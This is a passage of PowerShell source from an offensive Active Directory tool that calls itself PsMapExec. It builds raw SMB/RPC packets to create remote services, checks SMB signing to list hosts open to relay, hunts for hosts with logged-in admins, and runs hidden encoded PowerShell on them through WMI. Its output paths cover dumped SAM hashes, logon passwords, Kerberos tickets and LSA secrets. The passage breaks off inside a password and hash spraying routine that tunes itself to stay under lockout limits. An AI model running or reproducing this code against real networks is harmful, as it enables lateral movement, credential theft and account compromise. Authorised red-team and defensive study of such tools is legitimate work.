        param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

        if($packet_auth_length -gt 0)
        {
            $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
        }

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
        [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
        $packet_auth_length = $packet_auth_length[0,1]

        $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
        $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
        $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
        $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
        $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
        $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
        $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
        $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

        if($packet_data.Length)
        {
            $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
        }

        return $packet_RPCRequest
    }

    #SCM

    function Get-PacketSCMOpenSCManagerW()
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00

        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
        return $packet_SCMOpenSCManagerW
    }

    function Get-PacketSCMCreateServiceW()
    {
        param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
                [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
        $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID += 0x00,0x00

        $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",$packet_referent_ID)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",$packet_command)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SCMCreateServiceW
    }

    function Get-PacketSCMStartServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SCMStartServiceW
    }

    function Get-PacketSCMDeleteServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCMDeleteServiceW
    }

    function Get-PacketSCMCloseServiceHandle()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCM_CloseServiceW
    }

    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
    $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
    $process_ID = $process_ID -replace "-00-00",""
    [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    function Get-SMBSigningStatus
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version)

        if($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_client_receive = New-Object System.Byte[] 1024
        $SMB_client_stage = 'NegotiateSMB'
        
        :SMB_relay_challenge_loop while($SMB_client_stage -ne 'exit')
        {
        
            switch ($SMB_client_stage)
            {

                'NegotiateSMB'
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                    {
                        $SMB_version = 'SMB1'
                        $SMB_client_stage = 'NTLMSSPNegotiate'
                    }
                    else
                    {
                        $SMB_client_stage = 'NegotiateSMB2'
                    }

                    if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03'))
                    {
                        $SMBSigningStatus = $true
                        
                    } else {
                        $SMBSigningStatus = $false
                    }
                    $SMB_relay_socket.Close()
                    $SMB_client_receive = $null
                    $SMB_client_stage = 'exit'

                }
            
            }

        }
        return $SMBSigningStatus
    }

    if($Target) {
        $Targets += $Target
    }
    foreach ($Target in $Targets) {
        $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
        $SMB_relay_socket.Client.ReceiveTimeout = 3000
        $SMB_relay_socket.Connect($Target,"445")
        $HTTP_client_close = $false
        if(!$SMB_relay_socket.connected)
        {
        "$Target is not responding"
        }
        $SigningStatus = Get-SMBSigningStatus $SMB_relay_socket 'smb2'
        if ($SigningStatus){
            "Signing Enabled"
        } else {
            "Signing Not Required"
        }
        if ($Delay) {
            $Jitter = get-random -Minimum 0 -Maximum $DelayJitter
            sleep ($Delay+$Jitter)
        }
    }

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

Function GenRelayList {
    
    Write-Host
    $ErrorActionPreference = "SilentlyContinue"
    Get-SMBSigning
    
    foreach ($Computer in $Computers) {
    $OS = $computer.Properties["operatingSystem"][0]
    $ComputerName = $computer.Properties["dnshostname"][0]

$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {continue}   elseif ($Connected){

        if ($Method -eq "GenRelayList") {
            $Signing = Get-SMBSigning -Target $ComputerName

            if ($Signing -match "Signing Enabled") {
                if ($SuccessOnly) {
                    continue
                } elseif (!$SuccessOnly) {
                    Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                }
            }

            if ($Signing -match "Signing Not Required") {
                $ComputerName | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append
                Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
            }
        }

        if ($Method -eq "GenRelayList") {
            $SigningUnique = Get-Content -Path "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique | Sort
            Set-Content -Value $SigningUnique -Path "$SMB\SigningNotRequired-$Domain.txt" -Force
        }
    }
}

}

################################################################################################################
############################################ Function: SessionHunter ###########################################
################################################################################################################
Function Invoke-SessionHunter {
Write-host

Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command)

    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if (!$connected) {return}
    
    $osInfo = $null
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
    if (!$osInfo){return}


    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)


function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    function SessionHunter {
        param($ComputerName, $Command)

        $userSIDs = @()
        $domainCache = @{}
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $adminPresent = $false

        function GetDomainFQDNFromSID {
            param($sid)
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
            $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
            
            if (-not $domainCache[$objDomain]) {
                try {
                    $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
                    $domainCache[$objDomain] = $FQDN
                } catch {
                    return $objDomain
                }
            }
            return $domainCache[$objDomain]
        }

        try {
            $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
        } catch {
            return
        }

        $userKeys = $remoteRegistry.GetSubKeyNames()

        foreach ($key in $userKeys) {
            if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
                $userSIDs += $key
            }
        }

        $remoteRegistry.Close()

        foreach ($sid in $userSIDs) {
            try {
                $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
                $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
                $username = $userTranslation.Value.Split('\')[1]
                
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $adminPresent = $true
                    break
                }
            } catch {}
        }

        if ($adminPresent) {
            if ($Command -eq ""){
            # We can just return as OSinfo was checked earlier in script
            return "Successful connection PME"
            
            }
            elseif ($Command -ne ""){

            return WMI $ComputerName -command $Command
            
            }
        }

    }

   SessionHunter -ComputerName $computerName -command $Command

}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SessionHunter " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })



# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################## Function: Spray #############################################
################################################################################################################
Function Spray {
Write-host

if (!$EmptyPassword -and !$AccountAsPassword -and $Hash -eq "" -and $Password -eq ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "We need something to spray"
Write-Host
Write-host "PsMapExec -Method Spray -Password [Password]"
Write-host "PsMapExec -Method Spray -Hash [Hash]"
Write-host "PsMapExec -Method Spray -AccountAsPassword"
Write-host "PsMapExec -Method Spray -EmptyPassword"
return
}

if ($Hash -ne "" -and $Password -ne ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Hash and Password detected"
return
}

if ($EmptyPassword -and $Hash -ne "" -or ($EmptyPassword -and $Password -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return
}

if ($AccountAsPassword -and $Hash -ne "" -or ($AccountAsPassword -and $Password -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return
}

if ($AccountAsPassword -and $EmptyPassword){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
return
}

    

            
# Create a directory entry for the specified domain
$directoryEntry = [ADSI]"LDAP://$domain"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
$searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

# Set the filter to query the domainDNS object
$searcher.Filter = "(objectClass=domainDNS)"
$domainObject = $searcher.FindOne()

if ($domainObject.Properties.Contains("lockoutThreshold")) {
    $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
    # Check the lockout threshold value
    $LO_threshold = $lockoutThreshold

    if ($LO_threshold -eq "0") {
        $SafeLimit = 100000
    } elseif ($LO_threshold -lt 3) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Lockout threshold is 2 or less. Aborting..."
        return
    } elseif ($LO_threshold -lt 4) {
        $SafeLimit = 1
    } else {
        $SafeLimit = $LO_threshold - 2
    }
} else {
            Write-Host
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Threshold not found. Aborting..."
    return
}

$searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

# Display the $SafeLimit value
Write-Output " - Lockout Threshold  : $LO_threshold"
Write-Output " - Safety Limit value : $SafeLimit"
Write-Output " - Removed disabled accounts from spraying"

if ($Hash -ne ""){
    Write-Host
    $Password = ""
    $AccountAsPassword = $False

    if ($Hash.Length -ne 32 -and $Hash.Length -ne 64) {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        return
    }

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with Hash value: $Hash"
    Write-Host

}

if ($Password -ne ""){
    $Hash = ""
    $AccountAsPassword = $False

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying with password value: $Password"
    Write-Host

}


if ($AccountAsPassword){
    $Hash = ""
    $Password = ""

    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying usernames as passwords"
    Write-Host
}

if ($EmptyPassword){
    $Password = ""
    $Hash = ""
    $AccountAsPassword = $False     
    
    Write-Host
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Spraying empty passwords"
    Write-Host
}


foreach ($UserToSpray in $EnabledDomainUsers){
		$Delay = Get-Random -Minimum 8 -Maximum 90
		Start-Sleep -Milliseconds $Delay
 
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
$searchResult = $searcher.FindOne()
        $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

            if ($badPwdCount -ge $SafeLimit){
                if (!$SuccessOnly){
                    Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Safe threshold met"
                    continue
    }
}
           # Hash Spraying
            if ($Hash -ne ""){
